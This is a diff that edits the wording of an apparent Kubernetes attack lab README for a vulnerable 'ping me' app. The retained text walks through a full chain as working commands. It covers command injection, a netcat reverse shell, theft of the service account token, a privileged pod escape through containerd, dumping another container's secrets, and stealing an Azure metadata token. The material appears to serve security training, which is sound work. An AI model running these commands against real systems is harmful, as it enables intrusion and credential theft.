@@ -2,7 +2,7 @@
 
 ## Play with the sample app
 
-The sample app "ping me" pings a destination provided via the input field. Try the folloing inputs:
+The sample application "ping me" pings a target specified via the input field. Try the following inputs:
 
 ```bash
 127.0.0.1
@@ -15,8 +15,8 @@ The sample app "ping me" pings a destination provided via the input field. Try t
 <details>
 <summary>Details on how to input the snippets</summary>
 
-1. Let's try to inject a command after the IP address: `127.0.0.1; echo "I was here"`. As you see in the responce it worked.
-2. Now we try whether `bash` is available: `; which bash`. And it is! Looks like we could try to hijack the container.
+1. Let's try to inject a command after the IP address: `127.0.0.1; echo "I was here"`. As you can see in the answer, it worked.
+2. Now we try whether `bash` is available: `; which bash`. And it is! Looks like we can try to hijack the container.
 
 </details>
 
@@ -30,7 +30,7 @@ The sample app "ping me" pings a destination provided via the input field. Try t
 
 ## Hijack the container
 
-We now inject into the container via a reverse shell. Try the following:
+We now inject into the container via a reverse shell. Try to execute the following snippets:
 
 On your attacker machine:
 
@@ -48,7 +48,7 @@ Input for the app (change your IP):
 <summary>Details on how to hijack the container</summary>
 
 1. We will open a connection on our attacker machine using netcat: `sudo nc -lnvp 80`
-2. Now we inject the required command into our container. This allow us to connect a reverse shell to our open connection: `; bash -c 'bash -i >& /dev/tcp/0.0.0.0/80 0>&1'`.
+2. Now we inject the required command into our container. This will allow us to connect a reverse shell to our open connection: `; bash -c 'bash -i >& /dev/tcp/0.0.0.0/80 0>&1'`.
 3. And finally, we have a reverse shell up and running. Try some commands like `ls`
 
 </details>
@@ -64,7 +64,7 @@ Input for the app (change your IP):
 
 ## Get access to the Kubernetes API
 
-Let's see if we can access the API Server. Execute the following snippets:
+Let's see if we can access the API server. Execute the following snippets:
 
 ```bash
 TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
@@ -86,7 +86,8 @@ kubectl auth can-i create pod
 <details>
 <summary>Details on how to access the Kubernetes API server</summary>
 
-Let's see if we can access the API Server.
+Let's see if we can access the API server.
+
 ```bash
 TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
 CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
@@ -94,7 +95,7 @@ CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
 curl --cacert ${CA} --header "Authorization: Bearer ${TOKEN}" -X GET https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT_HTTPS/api
 ```
 
-It looks like we were able to authenticate and do have some access. Let's try whether we have access to see other pods in our namespace:
+It looks like we were able to authenticate and have some access. Now let's check if we have access to other pods in our namespace:
 
 ``` bash
 NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
@@ -137,7 +138,7 @@ kubectl auth can-i create pod
 
 ## Hijack the Kubernetes Node
 
-Let's try one more thing. Are we able to schedule a privileged pod and "talk" to containerd? Execute the following snippets:
+Let's try one more thing. Are we able to schedule a privileged pod and "talk" to containerd? Run the following snippets:
 
 ```bash
 cat <<EOF | kubectl apply -f -
@@ -176,7 +177,7 @@ ctr --address /mnt/containerd.sock --namespace k8s.io container list
 <details>
 <summary>Details on how to hijack the node</summary>
 
-Let's try to schedule a priviledged pod and try to "talk" to containerd:
+Let's try to create a privileged pod and "talk" to containerd:
 
 ```bash
 cat <<EOF | kubectl apply -f -
@@ -235,7 +236,7 @@ ctr --address /mnt/containerd.sock --namespace k8s.io container list
 
 ## Access secrets from another container
 
-We will now try to retrieve secrets from a container we do not have access to (via Kubernetes):
+We will now try to retrieve secrets from a container that we do not have access to (via Kubernetes):
 
 ```bash
 id=$(ctr --address /mnt/containerd.sock --namespace k8s.io container list | grep "13f21f8cb8c85084bc9a3ddf98ecae31de1e5255363bd3a9c9ed50528106676c" | awk '{print $1}')
@@ -243,10 +244,12 @@ id=$(ctr --address /mnt/containerd.sock --namespace k8s.io container list | grep
 ctr --address /mnt/containerd.sock --namespace k8s.io container info $id | jq .Spec.process.env
 ```
 
+We could now use the database connection secret to access the database.
+
 <details>
 <summary>Details on how to access the secrets</summary>
 
-We will use the containerd cli to access details of a container running on this nodes.
+We will use the containerd CLI to access details of a container running on this node.
 
 First we will retrieve the container ID:
 
@@ -254,7 +257,7 @@ First we will retrieve the container ID:
 id=$(ctr --address /mnt/containerd.sock --namespace k8s.io container list | grep "13f21f8cb8c85084bc9a3ddf98ecae31de1e5255363bd3a9c9ed50528106676c" | awk '{print $1}')
 ```
 
-And then request container runtime details like environemnt variables:
+And then request container runtime details such as environment variables:
 ```bash
 ctr --address /mnt/containerd.sock --namespace k8s.io container info $id | jq .Spec.process.env
 ```
@@ -276,7 +279,7 @@ We could now use the database connection secret to access the database.
 
 ## Hijack Cloud resources
 
-We can also use the underlying cloud identity and try to escape even further. Execute the following snippet to get a valid Cloud provider token:
+We can also use the underlying cloud identity and try to escape even further. Run the following snippet to get a valid cloud provider token (in our case the Client ID of the underlying Managed Identity):
 
 ```bash
 mount $(df | awk '{print $1}' | grep "/dev/sd") /tmp
@@ -285,23 +288,27 @@ IDENTITY=$(cat /tmp/etc/kubernetes/azure.json | jq -r .userAssignedIdentityID)
 
 TOKEN=$(curl 'http://169.254.169.254/metadata/identity/oauth2/token?client_id='$IDENTITY'&api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s | jq -r .access_token)
 ```
+
+We could now use the secret to talk to the cloud provider management plane (in our case Azure Resource Manager) and try to create or access further resources.
 
 <details>
 <summary>Details on how to retrieve a Cloud provider token</summary>
 
-First of all we need to mount the local node filesystem to access underlying identity id:
+First, we need to mount the local node's file system to access the underlying identity ID:
 
 ```bash
 mount $(df | awk '{print $1}' | grep "/dev/sd") /tmp
 ```
 
-We now can retrieve the used Cloud identity and request a valid token using the Cloud metadata service:
+We can now retrieve the cloud identity used and request a valid token via the cloud metadata service (in our case Azure Instance Metadata Service):
 
 ```bash
 IDENTITY=$(cat /tmp/etc/kubernetes/azure.json | jq -r .userAssignedIdentityID)
 
 TOKEN=$(curl 'http://169.254.169.254/metadata/identity/oauth2/token?client_id='$IDENTITY'&api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s | jq -r .access_token)
 ```
+
+We could now use the secret to talk to the cloud provider management plane (in our case Azure Resource Manager) and try to create or access further resources.
 
 </details>
 
